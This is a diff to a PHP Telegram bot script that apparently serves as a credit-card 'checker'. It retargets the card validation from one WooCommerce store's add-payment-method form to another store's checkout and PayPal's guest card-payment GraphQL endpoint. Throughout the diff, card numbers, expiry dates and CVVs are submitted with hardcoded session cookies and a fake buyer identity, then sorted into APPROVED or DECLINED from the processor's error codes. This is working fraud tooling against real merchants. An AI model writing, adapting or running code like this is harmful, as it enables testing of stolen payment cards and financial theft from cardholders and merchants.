@@ -205,6 +205,7 @@ $live_array = array(
     'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
     'Insufficient Funds',
     'Transaction not permitted by issuer',
+    'EXISTING_ACCOUNT_RESTRICTED',
 //    'Your payment method was rejected due to 3D Secure.',
     'transaction_not_allowed',
     'CVV INVALID',
@@ -2665,7 +2666,8 @@ $ano1  = $i[2];
 $cvv   = $i[3];
 
 $bin = substr($lista, 0, 6);
-$ma = "$mes+%2F+$ano";
+$ma = "$mes/$ano1";
+//$ma = "$mes+%2F+$ano";
 
 ////
 $num = "$cc$mes$ano1$cvv";
@@ -2698,67 +2700,101 @@ $BinData = BinData($bin); //Extrae los datos del bin
 //SACA EL NONCE1/////
 	
 $curl = curl_init();
-
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.warfighterhemp.com/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://dream-beat.com/checkout/',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'GET',
-  CURLOPT_COOKIE => 'PHPSESSID=de8bc69502cab7470b0b6f44e0879c83; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-29%2001%3A44%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fcreate-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-29%2001%3A44%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fcreate-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; undefined=hidden; lepopup-onload-WFH-Age-Verification=ilovefamily; wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=stioness61%7C1728783995%7CAcI2j0WxhXXIRoLBSZtlEoH8vIAygrpQ2NrHn6T5x9n%7C7543ba2dfa5bc9ac5006be8d233548492e4333654839987e3d4437e254868d3a; wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5912%7Cother%7Cread%7C8ede0cb765a070fafe505986385b9602c8dadc74d08ee0811f00f81e925fca94; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fpayment-methods%2F',
+  CURLOPT_COOKIE => 'wordpress_logged_in_16be603727c326eebbb2512f82748386=stioness61%7C1728880015%7Cv6PHbSLuZn3Jc3epxV0T9lOQJNUvwb2e4WDoROUzd3k%7C5a68a65bcf1a33003f778f03aee6b4daa9ab96f2b63ff8c9184c878b4605af8a; wp_woocommerce_session_16be603727c326eebbb2512f82748386=70%7C%7C1727843334%7C%7C1727839734%7C%7C83d705e5d28ee19966262db75fe12962; woocommerce_items_in_cart=1; woocommerce_cart_hash=99bef3021b4727bb71408c7a5ff715de; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-30%2016%3A15%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fedit-address%2F; sbjs_first_add=fd%3D2024-09-30%2016%3A15%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fedit-address%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
-    'accept-language: es-US,es;q=0.7',
-    'referer: https://www.warfighterhemp.com/my-account/payment-methods/',
+    'referer: https://dream-beat.com/',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
 
+// Expresión regular para encontrar el nonce de create_order
+$patron = '/"create_order":\{"endpoint":.*?"nonce":"([a-f0-9]+)"/';
+// Buscar coincidencia
+preg_match($patron, $response, $coincidencia);
+// Extraer valor
+$nonce = $coincidencia[1];
 curl_close($curl);
 
 
-preg_match('/<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="(.*?)" \/>/', $response, $matches);
-$nonce2 = $matches[1] ?? null;
 
-
-echo "nonce2 $nonce2\n";
-
-
-//43fca0d212
 $curl = curl_init();
 curl_setopt_array($curl, [
-  CURLOPT_URL => 'https://www.warfighterhemp.com/my-account/add-payment-method/',
+  CURLOPT_URL => 'https://dream-beat.com?wc-ajax=ppc-create-order',
   CURLOPT_RETURNTRANSFER => true,
   CURLOPT_ENCODING => '',
   CURLOPT_MAXREDIRS => 10,
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'payment_method=nmi_gateway_woocommerce_credit_card&wc-nmi-gateway-woocommerce-credit-card-account-number='.$cc.'&wc-nmi-gateway-woocommerce-credit-card-expiry='.$ma.'&wc-nmi-gateway-woocommerce-credit-card-csc='.$cvv.'&woocommerce-add-payment-method-nonce='.$nonce2.'&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1',
-  CURLOPT_COOKIE => 'PHPSESSID=de8bc69502cab7470b0b6f44e0879c83; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-29%2001%3A44%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fcreate-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-29%2001%3A44%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fcreate-account%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; undefined=hidden; lepopup-onload-WFH-Age-Verification=ilovefamily; wordpress_logged_in_e1799a98d401098f9b47d4c3f78c6c00=stioness61%7C1728783995%7CAcI2j0WxhXXIRoLBSZtlEoH8vIAygrpQ2NrHn6T5x9n%7C7543ba2dfa5bc9ac5006be8d233548492e4333654839987e3d4437e254868d3a; wfwaf-authcookie-a566fef2ac3836d146bc189f6ed40f0e=5912%7Cother%7Cread%7C8ede0cb765a070fafe505986385b9602c8dadc74d08ee0811f00f81e925fca94; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.warfighterhemp.com%2Fmy-account%2Fadd-payment-method%2F',
+  CURLOPT_POSTFIELDS => '{"nonce":"'.$nonce.'","payer":{"email_address":"Stioness61@teleworm.us","name":{"surname":"Perez","given_name":"Carlos"},"address":{"country_code":"CA","address_line_1":"6195 bollinger rd","address_line_2":"","admin_area_1":"NS","admin_area_2":"New york","postal_code":"B3H 3J5"},"phone":{"phone_type":"HOME","phone_number":{"national_number":"4179204022"}}},"bn_code":"Woo_PPCP","context":"checkout","order_id":"0","payment_method":"ppcp-card-button-gateway","funding_source":"card","form_encoded":"wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fdream-beat.com%2Fmy-account%2Fedit-address%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fdream-beat.com%2Fcheckout%2F&wc_order_attribution_session_start_time=2024-09-30+16%3A15%3A54&wc_order_attribution_session_pages=4&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Linux%3B+Android+10%3B+K%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F129.0.0.0+Mobile+Safari%2F537.36&billing_first_name=Carlos&billing_last_name=Perez&billing_company=&billing_country=CA&billing_address_1=6195+bollinger+rd&billing_address_2=&billing_city=New+york&billing_state=NS&billing_postcode=B3H+3J5&billing_phone=4179204022&billing_email=Stioness61%40teleworm.us&ship_to_different_address=1&shipping_first_name=Carlos&shipping_last_name=Perez&shipping_company=&shipping_country=US&shipping_address_1=6195+bollinger+rd&shipping_address_2=&shipping_city=New+york&shipping_state=AZ&shipping_postcode=34722&shipping_phone=%28417%29-920-4022&order_comments=&shipping_method%5B0%5D=flat_rate%3A4&payment_method=ppcp-card-button-gateway&woocommerce-process-checkout-nonce=5b88f8b36d&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card","createaccount":false,"save_payment_method":false}',
+  CURLOPT_COOKIE => 'wordpress_logged_in_16be603727c326eebbb2512f82748386=stioness61%7C1728880015%7Cv6PHbSLuZn3Jc3epxV0T9lOQJNUvwb2e4WDoROUzd3k%7C5a68a65bcf1a33003f778f03aee6b4daa9ab96f2b63ff8c9184c878b4605af8a; wp_woocommerce_session_16be603727c326eebbb2512f82748386=70%7C%7C1727843334%7C%7C1727839734%7C%7C83d705e5d28ee19966262db75fe12962; woocommerce_items_in_cart=1; woocommerce_cart_hash=99bef3021b4727bb71408c7a5ff715de; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-30%2016%3A15%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fedit-address%2F; sbjs_first_add=fd%3D2024-09-30%2016%3A15%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fdream-beat.com%2Fmy-account%2Fedit-address%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F129.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fdream-beat.com%2Fcheckout%2F',
   CURLOPT_HTTPHEADER => [
     'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
-    'Content-Type: application/x-www-form-urlencoded',
-    'origin: https://www.warfighterhemp.com',
-    'referer: https://www.warfighterhemp.com/my-account/add-payment-method/',
+    'Content-Type: application/json',
+    'origin: https://dream-beat.com',
+    'sec-fetch-dest: empty',
+    'referer: https://dream-beat.com/checkout/',
   ],
 ]);
 
 $response = curl_exec($curl);
 $err = curl_error($curl);
+$json = json_decode($response, true);
+$token = $json['data']['id'];
 curl_close($curl);
 
-$result1 = trim(strpos($response, "Nice! New payment method added") !== false) ? "Approved" : trim(strip_tags(capture($response, '<ul class="woocommerce-error" role="alert">', '</ul>'))) ?? "An error occurred, please try again";
-$patron = "/failed: (.*)/";
-preg_match($patron, $result1, $matches);
-$respo = $matches[1];
 
-sendPv($myid, $result1);
-sendPv($myid, $respo);
+
+
+//$token = "9YA37547VB014302Y";
+
+$palabras_originales = array("TOKEN", "CC", "ANO", "CVV");
+$palabras_nuevas = array($token ,$cc, $ma, $cvv);
+$texto = '{"query":"\\n        mutation payWithCard(\\n            $token: String!\\n            $card: CardInput!\\n            $phoneNumber: String\\n            $firstName: String\\n            $lastName: String\\n            $shippingAddress: AddressInput\\n            $billingAddress: AddressInput\\n            $email: String\\n            $currencyConversionType: CheckoutCurrencyConversionType\\n            $installmentTerm: Int\\n            $identityDocument: IdentityDocumentInput\\n        ) {\\n            approveGuestPaymentWithCreditCard(\\n                token: $token\\n                card: $card\\n                phoneNumber: $phoneNumber\\n                firstName: $firstName\\n                lastName: $lastName\\n                email: $email\\n                shippingAddress: $shippingAddress\\n                billingAddress: $billingAddress\\n                currencyConversionType: $currencyConversionType\\n                installmentTerm: $installmentTerm\\n                identityDocument: $identityDocument\\n            ) {\\n                flags {\\n                    is3DSecureRequired\\n                }\\n                cart {\\n                    intent\\n                    cartId\\n                    buyer {\\n                        userId\\n                        auth {\\n                            accessToken\\n                        }\\n                    }\\n                    returnUrl {\\n                        href\\n                    }\\n                }\\n                paymentContingencies {\\n                    threeDomainSecure {\\n                        status\\n                        method\\n                        redirectUrl {\\n                            href\\n                        }\\n                        parameter\\n                    }\\n                }\\n            }\\n        }\\n        ","variables":{"token":"TOKEN","card":{"cardNumber":"CC","type":"VISA","expirationDate":"ANO","postalCode":"97251","securityCode":"CVV"},"firstName":"Carlos","lastName":"Perez","billingAddress":{"givenName":"Carlos","familyName":"Perez","line1":"6195 bollinger rd","line2":null,"city":"New york","state":"PA","postalCode":"97251","country":"US"},"email":"Stioness61@teleworm.us","currencyConversionType":"PAYPAL"},"operationName":null}';
+$data = str_replace($palabras_originales, $palabras_nuevas, $texto);
+
+//exit;
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.paypal.com/graphql?fetch_credit_form_submit=',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => $data,
+//  CURLOPT_COOKIE => 'ts_c=vr%3D413a95c71920a79828d514f3fd1cb6f0%26vt%3D413a95c71920a79828d514f3fd1cb6ef; rssk=d%7DC9%408%3A%3B%3C52%3D88B6%3Exqx%3EyjxA%3B%7B%7Ds%3F11; enforce_policy=ccpa; nsid=s%3A_cCf84ps2hiSaTF1hhboEd0V52nd3Jss.QG8Y5AKhLG5kcGK944%2FIRtbDm8EkW4ghdm%2FBJmOietc; KHcl0EuY7AKSMgfvHl7J5E7hPtK=zCn26v398JEvSd_Q1O-KGLzC8-6q9y1FSvEOmxuQFFLV5WN2fGuH29oVhj_bwKCyvqGQCCFIK85ONR44; sc_f=n5_FXGnLiZky8WyJSr60IOHIrq2KDEkMKgbVcDQIyaHmY9J4sGd27lToaExhi49Crc3-m_EK_eQGG9PjcrzhD4Ssx3i_GfRzOW135m; login_email=Stioness61%40teleworm.us; l7_az=dcg14.slc; LANG=es_XC%3BUS; AV894Kt2TSumQQrJwe-8mzmyREO=S23AAMr9bcZqEf9fQp-cZfP6xYVU1YzeLrPYRbVQXBjeiHwy9xiGBE1kYrLSOFIXriAD_yuTeOyoE_U8kfEOugvogwirnLtJA; tsrce=xobuyernodeserv; x-pp-s=eyJ0IjoiMTcyNzY3MTg0NTMxOCIsImwiOiIwIiwibSI6IjAifQ; ts=vreXpYrS%3D1822279845%26vteXpYrS%3D1727673645%26vr%3D413a95c71920a79828d514f3fd1cb6f0%26vt%3D413a95c71920a79828d514f3fd1cb6ef%26vtyp%3Dnew',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/json',
+    'paypal-client-context: 88J91547RT8631351',
+    'x-app-name: standardcardfields',
+    'paypal-client-metadata-id: 88J91547RT8631351',
+    'x-country: US',
+    'origin: https://www.paypal.com',
+    'sec-fetch-dest: empty',
+    'referer: https://www.paypal.com/smart/card-fields?sessionID=uid_3f5f477a89_mdq6mjc6ndc&buttonSessionID=uid_71978bd242_mdq6ndm6mti&locale.x=en_US&commit=true&hasShippingCallback=false&env=production&country.x=US&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QWFIZHNiMThlRW5hLXFNcVNTRk9zV3BkTUpBMmRleUtNdTBaYlZQUXhhbUttdTE3blpJR3gyd21aMUhzQXoycFBWM0dSdDRhTWtBMHpGQ2wmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wNC0wMyZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciZsb2NhbGU9ZW5fVVMiLCJhdHRycyI6eyJkYXRhLXBhcnRuZXItYXR0cmlidXRpb24taWQiOiJXb29fUFBDUCIsImRhdGEtdWlkIjoidWlkX3J2dHBvbXZycGp6eHVvc2tnc3Z6amJjd25yZXd6ZiJ9fQ&disable-card=&token=88J91547RT8631351',
+  ],
+]);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$respo = $json['errors'][0]['data'][0]['code'];
+$mensaje = $json['errors'][0]['message'];
+curl_close($curl);
 	
 $timetakeen = (microtime(true) - $startTime);
 $time = substr_replace($timetakeen, '', 4);
@@ -2766,17 +2802,12 @@ $proxy = "LIVE ✅";
 
 
 
-if ($respo == 'The card verification number does not match. Please re-enter and try again.'){
-$respo = 'Card Issuer Declined CVV';
-}
-
 
 if (empty($respo)) {
-$respo = $result1;
+$respo = $response;
 } else {
 $respo = $respo;
 }
-
 
 
 $bin = "<code>".$bin."</code>";
@@ -2791,7 +2822,7 @@ echo "$respo\n";
 if (array_in_string($respo, $live_array)) {
     $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: APPROVED ✅\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
     $live = True;
-} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
+} elseif (strpos($respo, 'CARD_GENERIC_ERROR') !== false || strpos($respo, 'Do Not Honor') !== false || strpos($respo, 'Issuer Declined MCC') !== false || strpos($respo, 'Invalid card number') !== false || strpos($respo, 'Transaction not permitted by issuer') !== false) {
     $respuesta = "━━━━━━━━•⟮sᴛʀɪᴘᴇ⟯•━━━━━━━━\n➭ 𝙲𝙰𝚁𝙳: ".$lista."\n➭ 𝚂𝚃𝙰𝚃𝚄𝚂: DECLINED ❌\n➭ 𝚁𝙴𝚂𝙿𝙾𝙽𝚂𝙴: ".$respo."\n➭ 𝙶𝙰𝚃𝙴𝚆𝙰𝚈: War Auth\n".$BinData."\n━━━━━━━━━•⟮ɪɴғᴏ⟯•━━━━━━━━━\n➭ 𝙿𝚁𝙾𝚇𝚈: ".$proxy."\n➭ 𝚃𝙸𝙼𝙴 𝚃𝙰𝙺𝙴𝙽: ".$time."'Seg\n➭ 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 𝙱𝚈: @".$user." - ".$tipo."\n➭ 𝙱𝙾𝚃 𝙱𝚈: ".$admin."\n━━━━━━━━━━• 么•━━━━━━━━━━\n";
     $live = False;
 } else {
